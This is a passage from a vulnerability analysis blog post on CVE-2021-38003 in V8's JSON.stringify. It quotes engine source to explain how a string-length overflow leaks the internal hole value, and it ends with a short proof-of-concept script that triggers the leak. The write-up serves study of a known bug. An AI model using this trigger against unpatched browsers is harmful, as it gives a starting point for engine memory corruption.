</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">PACKED_DOUBLE_ELEMENTS</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">// Empty array is FixedArray but not FixedDoubleArray.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        <span style="color:#ff79c6">if</span> (length <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>        Handle<span style="color:#ff79c6">&lt;</span>FixedDoubleArray<span style="color:#ff79c6">&gt;</span> elements(
</span></span><span style="display:flex;"><span>            FixedDoubleArray<span style="color:#ff79c6">::</span>cast(object<span style="color:#ff79c6">-&gt;</span>elements()), isolate_);
</span></span><span style="display:flex;"><span>        StackLimitCheck <span style="color:#50fa7b">interrupt_check</span>(isolate_);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (i <span style="color:#ff79c6">&lt;</span> length) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (interrupt_check.InterruptRequested() <span style="color:#ff79c6">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>              isolate_<span style="color:#ff79c6">-&gt;</span>stack_guard()<span style="color:#ff79c6">-&gt;</span>HandleInterrupts().IsException(
</span></span><span style="display:flex;"><span>                  isolate_)) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          Separator(i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>          SerializeDouble(elements<span style="color:#ff79c6">-&gt;</span>get_scalar(i));
</span></span><span style="display:flex;"><span>          i<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">PACKED_ELEMENTS</span>: {
</span></span><span style="display:flex;"><span>        Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> old_length(object<span style="color:#ff79c6">-&gt;</span>length(), isolate_);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> (i <span style="color:#ff79c6">&lt;</span> length) {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (object<span style="color:#ff79c6">-&gt;</span>length() <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">*</span>old_length <span style="color:#ff79c6">||</span>
</span></span><span style="display:flex;"><span>              object<span style="color:#ff79c6">-&gt;</span>GetElementsKind() <span style="color:#ff79c6">!=</span> PACKED_ELEMENTS) {
</span></span><span style="display:flex;"><span>            <span style="color:#6272a4">// Fall back to slow path.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>            <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          Separator(i <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>);
</span></span><span style="display:flex;"><span>          Result result <span style="color:#ff79c6">=</span> SerializeElement(
</span></span><span style="display:flex;"><span>              isolate_,
</span></span><span style="display:flex;"><span>              Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span>(FixedArray<span style="color:#ff79c6">::</span>cast(object<span style="color:#ff79c6">-&gt;</span>elements()).get(i),
</span></span><span style="display:flex;"><span>                             isolate_),
</span></span><span style="display:flex;"><span>              i);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">==</span> UNCHANGED) {
</span></span><span style="display:flex;"><span>            builder_.AppendCString(<span style="color:#f1fa8c">&#34;null&#34;</span>);
</span></span><span style="display:flex;"><span>          } <span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (result <span style="color:#ff79c6">!=</span> SUCCESS) {
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          i<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">// The FAST_HOLEY_* cases could be handled in a faster way. They resemble
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#6272a4">// the non-holey cases except that a lookup is necessary for holes.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (i <span style="color:#ff79c6">&lt;</span> length) {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Slow path for non-fast elements and fall-back in edge case.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    Result result <span style="color:#ff79c6">=</span> SerializeArrayLikeSlow(object, i, length);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">!=</span> SUCCESS) <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  Unindent();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (length <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0</span>) NewLine();
</span></span><span style="display:flex;"><span>  builder_.AppendCharacter(<span style="color:#f1fa8c">&#39;]&#39;</span>);
</span></span><span style="display:flex;"><span>  StackPop();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>JsonStringifier<span style="color:#ff79c6">::</span>Result JsonStringifier<span style="color:#ff79c6">::</span>SerializeArrayLikeSlow(
</span></span><span style="display:flex;"><span>    Handle<span style="color:#ff79c6">&lt;</span>JSReceiver<span style="color:#ff79c6">&gt;</span> object, <span style="color:#8be9fd">uint32_t</span> start, <span style="color:#8be9fd">uint32_t</span> length) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">uint32_t</span> i <span style="color:#ff79c6">=</span> start; i <span style="color:#ff79c6">&lt;</span> length; i<span style="color:#ff79c6">++</span>) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    Result result <span style="color:#ff79c6">=</span> SerializeElement(isolate_, element, i);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">==</span> SUCCESS) <span style="color:#ff79c6">continue</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (result <span style="color:#ff79c6">==</span> UNCHANGED) {
</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">// Detect overflow sooner for large sparse arrays.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">if</span> (builder_.HasOverflowed()) <span style="color:#ff79c6">return</span> EXCEPTION;
</span></span><span style="display:flex;"><span>      builder_.AppendCString(<span style="color:#f1fa8c">&#34;null&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In <code>SerializeArrayLikeSlow()</code> , serialization is performed by inserting¬†the elements of the array passed as arguments one by one into <code>SerializeElement()</code>.¬†During this process, if the length of the serialized string¬†¬†exceeds <code>String::kMaxLength</code>, the¬†¬†<code>overflowed_</code>¬†flag¬†¬†is set to true.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/include/v8-primitive.h */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">V8_EXPORT</span> <span style="color:#8be9fd;font-style:italic">String</span> : <span style="color:#ff79c6">public</span> Name {
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">public</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">constexpr</span> <span style="color:#8be9fd">int</span> kMaxLength <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>      internal<span style="color:#ff79c6">::</span>kApiSystemPointerSize <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span> <span style="color:#ff79c6">?</span> (<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">28</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">16</span> <span style="color:#ff79c6">:</span> (<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">29</span>) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">24</span>;
</span></span></code></pre></div><p>If the return value of <code>SerializeElement()</code> is <code>UNCHANGED</code>  , <code>HasOverflowed()</code> is called and  the value of <code>overflowed_</code> is checked to check whether overflow has occurred. If overflow has occurred,  <code>SerializeArrayLikeSlow()</code> immediately  returns <code>EXCEPTION</code>. The only routine that sets <code>overflowed_</code> to true  is in <code>IncrementalStringBuilder::Accumulate()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/strings/string-builder.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> IncrementalStringBuilder<span style="color:#ff79c6">::</span>Accumulate(Handle<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> new_part) {
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> new_accumulator;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (accumulator()<span style="color:#ff79c6">-&gt;</span>length() <span style="color:#ff79c6">+</span> new_part<span style="color:#ff79c6">-&gt;</span>length() <span style="color:#ff79c6">&gt;</span> String<span style="color:#ff79c6">::</span>kMaxLength) {
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">// Set the flag and carry on. Delay throwing the exception till the end.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    new_accumulator <span style="color:#ff79c6">=</span> factory()<span style="color:#ff79c6">-&gt;</span>empty_string();
</span></span><span style="display:flex;"><span>    overflowed_ <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">true</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    new_accumulator <span style="color:#ff79c6">=</span>
</span></span><span style="display:flex;"><span>        factory()<span style="color:#ff79c6">-&gt;</span>NewConsString(accumulator(), new_part).ToHandleChecked();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  set_accumulator(new_accumulator);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If the result of adding the length of the existing string and the length of the new string to be added is greater than <code>String::kMaxLength</code>, <code>overflowed_</code> is  set to true and the string is  initialized with <code>empty_string()</code>. <code>Accumulate()</code> is called from  <code>Extend()</code> and <code>Finish()</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/strings/string-builder.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> IncrementalStringBuilder<span style="color:#ff79c6">::</span>Extend() {
</span></span><span style="display:flex;"><span>  DCHECK_EQ(current_index_, current_part()<span style="color:#ff79c6">-&gt;</span>length());
</span></span><span style="display:flex;"><span>  Accumulate(current_part());
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (part_length_ <span style="color:#ff79c6">&lt;=</span> kMaxPartLength <span style="color:#ff79c6">/</span> kPartLengthGrowthFactor) {
</span></span><span style="display:flex;"><span>    part_length_ <span style="color:#ff79c6">*=</span> kPartLengthGrowthFactor;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  Handle<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> new_part;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (encoding_ <span style="color:#ff79c6">==</span> String<span style="color:#ff79c6">::</span>ONE_BYTE_ENCODING) {
</span></span><span style="display:flex;"><span>    new_part <span style="color:#ff79c6">=</span> factory()<span style="color:#ff79c6">-&gt;</span>NewRawOneByteString(part_length_).ToHandleChecked();
</span></span><span style="display:flex;"><span>  } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    new_part <span style="color:#ff79c6">=</span> factory()<span style="color:#ff79c6">-&gt;</span>NewRawTwoByteString(part_length_).ToHandleChecked();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Reuse the same handle to avoid being invalidated when exiting handle scope.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  set_current_part(new_part);
</span></span><span style="display:flex;"><span>  current_index_ <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MaybeHandle<span style="color:#ff79c6">&lt;</span>String<span style="color:#ff79c6">&gt;</span> IncrementalStringBuilder<span style="color:#ff79c6">::</span>Finish() {
</span></span><span style="display:flex;"><span>  ShrinkCurrentPart();
</span></span><span style="display:flex;"><span>  Accumulate(current_part());
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (overflowed_) {
</span></span><span style="display:flex;"><span>    THROW_NEW_ERROR(isolate_, NewInvalidStringLengthError(), String);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#50fa7b">accumulator</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If the string is too long, the process of¬†dividing it into several parts and concatenating¬†them is repeated, and¬†¬†Extend() is called in the process.¬†¬†Finish() is called when all elements are processed and serialization is completed.¬†¬†Finish()¬†generates an error if¬†¬†overflowed_ is true,¬†but Extend() does not have a routine to handle overflow. Therefore,¬†causing an overflow before Finish() is called, that is, before serialization is complete, and causing¬†the return value of SerializeElement()¬†to be UNCHANGED can cause a bug.¬†¬†¬†¬†¬†</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  V8_INLINE Result <span style="color:#50fa7b">SerializeElement</span>(Isolate<span style="color:#ff79c6">*</span> isolate, Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object,
</span></span><span style="display:flex;"><span>                                    <span style="color:#8be9fd">int</span> i) {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> Serialize_<span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd;font-style:italic">false</span><span style="color:#ff79c6">&gt;</span>(object, <span style="color:#8be9fd;font-style:italic">false</span>,
</span></span><span style="display:flex;"><span>                             Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span>(Smi<span style="color:#ff79c6">::</span>FromInt(i), isolate));
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/json/json-stringifier.cc */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">template</span> <span style="color:#ff79c6">&lt;</span><span style="color:#8be9fd">bool</span> deferred_string_key<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>JsonStringifier<span style="color:#ff79c6">::</span>Result JsonStringifier<span style="color:#ff79c6">::</span>Serialize_(Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> object,
</span></span><span style="display:flex;"><span>                                                    <span style="color:#8be9fd">bool</span> comma,
</span></span><span style="display:flex;"><span>                                                    Handle<span style="color:#ff79c6">&lt;</span>Object<span style="color:#ff79c6">&gt;</span> key) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">switch</span> (HeapObject<span style="color:#ff79c6">::</span>cast(<span style="color:#ff79c6">*</span>object).map().instance_type()) {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">ODDBALL_TYPE</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">switch</span> (Oddball<span style="color:#ff79c6">::</span>cast(<span style="color:#ff79c6">*</span>object).kind()) {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kFalse</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;false&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kTrue</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;true&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">case</span> Oddball<span style="color:#ff79c6">::</span><span style="color:#8be9fd;font-style:italic">kNull</span>:
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (deferred_string_key) SerializeDeferredKey(comma, key);
</span></span><span style="display:flex;"><span>          builder_.AppendCString(<span style="color:#f1fa8c">&#34;null&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> SUCCESS;
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">default</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> UNCHANGED;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If the element&rsquo;s type is¬†ODDBALL_TYPE other than¬†¬†Oddball::kFalse,¬†¬†Oddball::kTrue, or¬†Oddball¬†¬†::kNull,¬†SerializeElement()¬†returns UNCHANGED.¬†¬†¬†</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* v8/src/objects/oddball.h */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// The Oddball describes objects null, undefined, true, and false.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Oddball</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">public</span> TorqueGeneratedOddball<span style="color:#ff79c6">&lt;</span>Oddball, PrimitiveHeapObject<span style="color:#ff79c6">&gt;</span> {
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kFalse <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kTrue <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kNotBooleanMask <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">static_cast</span><span style="color:#ff79c6">&lt;</span>byte<span style="color:#ff79c6">&gt;</span>(<span style="color:#ff79c6">~</span><span style="color:#bd93f9">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kTheHole <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kNull <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kArgumentsMarker <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kUndefined <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kUninitialized <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">6</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kOther <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">7</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kException <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kOptimizedOut <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">9</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kStaleRegister <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kSelfReferenceMarker <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">10</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">static</span> <span style="color:#ff79c6">const</span> byte kBasicBlockCountersMarker <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">11</span>;
</span></span></code></pre></div><h2 id="poc">POC</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#6272a4">/* poc.js */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>let hole;
</span></span><span style="display:flex;"><span>let a <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;a&#39;</span>.repeat(<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">28</span>), <span style="color:#f1fa8c">&#39;b&#39;</span>.repeat(<span style="color:#bd93f9">1</span> <span style="color:#ff79c6">&lt;&lt;</span> <span style="color:#bd93f9">28</span>), <span style="color:#f1fa8c">&#39;c&#39;</span>.repeat(<span style="color:#bd93f9">0x10000</span>), , <span style="color:#f1fa8c">&#39;d&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span> {
</span></span><span style="display:flex;"><span>    JSON.stringify(a);
</span></span><span style="display:flex;"><span>} <span style="color:#ff79c6">catch</span> (e) {
</span></span><span style="display:flex;"><span>    hole <span style="color:#ff79c6">=</span> e;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">%</span> DebugPrint(hole);
</span></span></code></pre></div>
		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/cve-2021-38003">CVE-2021-38003</a></li>
					
					<li><a href="/tags/hole-leak">hole-leak</a></li>
					
					<li><a href="/tags/v8">V8</a></li>
					
					<li><a href="/tags/javascript">Javascript</a></li>
					
					<li><a href="/tags/turbofan">Turbofan</a></li>
					
					<li><a href="/tags/compiler">Compiler</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/arzedlab/" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/ravshan-rikhsiev/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/arzedlab/" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    2025  ¬© Ravshan | Made with Love ‚ù§Ô∏è <a href="https://twitter.com/arzedlab/"> My Twitter ü™Ω</a>
  </div>
</footer>
<script>
  feather.replace()
</script></div>
    </body>
</html>
